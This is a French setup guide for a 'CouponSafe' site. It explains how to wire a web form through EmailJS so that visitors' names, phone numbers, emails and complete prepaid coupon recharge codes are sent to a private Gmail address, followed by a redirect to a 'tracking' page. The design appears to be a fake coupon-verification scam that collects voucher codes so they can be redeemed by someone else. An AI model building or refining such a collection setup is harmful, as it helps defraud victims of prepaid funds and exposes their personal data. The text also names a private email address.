# Configuration EmailJS pour CouponSafe

## Étapes pour configurer la réception des emails

### 1. Créer un compte EmailJS
1. Allez sur [https://www.emailjs.com/](https://www.emailjs.com/)
2. Créez un compte gratuit
3. Vérifiez votre email

### 2. Créer un service email
1. Dans le dashboard EmailJS, cliquez sur "Email Services"
2. Cliquez sur "Add New Service"
3. Choisissez "Gmail" (recommandé) ou votre service email préféré
4. Connectez votre compte email (adrienkoba311@gmail.com)
5. Donnez un nom à votre service (ex: "gmail_service")

### 3. Créer un template email
1. Cliquez sur "Email Templates"
2. Cliquez sur "Create New Template"
3. Utilisez le template suivant:

**Template ID:** (sera généré automatiquement)
**Service ID:** (celui de l'étape 2)

#### Contenu du template:

**Subject:**
```
Nouvelle demande de vérification CouponSafe - {{from_name}}
```

**Message:**
```
Bonjour,

Une nouvelle demande de vérification de coupon a été soumise sur CouponSafe.

DÉTAILS DE LA DEMANDE:
========================

Informations personnelles:
- Nom: {{from_name}}
- Email: {{from_email}}
- Téléphone: {{phone}}

Détails du coupon:
- Type de coupon: {{coupon_type}}
- Montant: {{amount}}
- Code complet: {{full_code}}
- Codes individuels: {{individual_codes}}

Informations supplémentaires:
- Date de soumission: {{submission_time}}
- Fichiers uploadés: {{uploaded_files}}
- Conditions acceptées: {{terms_accepted}}

Message: {{user_message}}

Cordialement,
L'équipe CouponSafe
```

### 4. Obtenir vos identifiants
1. Dans le dashboard, allez dans "Account" → "API Keys"
2. Copiez votre **Public Key**
3. Notez votre **Service ID** (de l'étape 2)
4. Notez votre **Template ID** (de l'étape 3)

### 5. Mettre à jour le code
Dans le fichier `submit.html`, remplacez les valeurs suivantes:

1. Ligne 187: Remplacez `YOUR_PUBLIC_KEY` par votre clé publique
2. Ligne 647: Remplacez `YOUR_SERVICE_ID` par votre service ID
3. Ligne 647: Remplacez `YOUR_TEMPLATE_ID` par votre template ID

### 6. Tester
1. Ouvrez `submit.html` dans votre navigateur
2. Remplissez le formulaire avec des informations test
3. Soumettez le formulaire
4. Vous devriez recevoir un email structuré à adrienkoba311@gmail.com

## Fonctionnalités implémentées

### ✅ Collecte des données:
- Email de l'utilisateur
- Nom complet
- Numéro de téléphone
- Type de coupon
- Montant et devise
- Codes de recharge (4 parties)
- Fichiers uploadés (noms des fichiers)
- Acceptation des conditions
- Horodatage de soumission

### ✅ Envoi email:
- Email structuré et formaté
- Backup avec mailto si EmailJS échoue
- Notifications utilisateur
- Redirection automatique vers la page de suivi

### ✅ Sécurité:
- Validation des champs requis
- Taille limite des fichiers (5MB)
- Types de fichiers acceptés (images, PDF)
- Protection contre les soumissions vides

## Alternative: Mailto (sans EmailJS)

Si vous ne souhaitez pas configurer EmailJS, le système utilisera automatiquement le client email par défaut avec un lien mailto pré-rempli.

## Support

Pour toute question sur la configuration, consultez la documentation EmailJS:
[https://www.emailjs.com/docs/tutorial/creating-contact-form](https://www.emailjs.com/docs/tutorial/creating-contact-form)
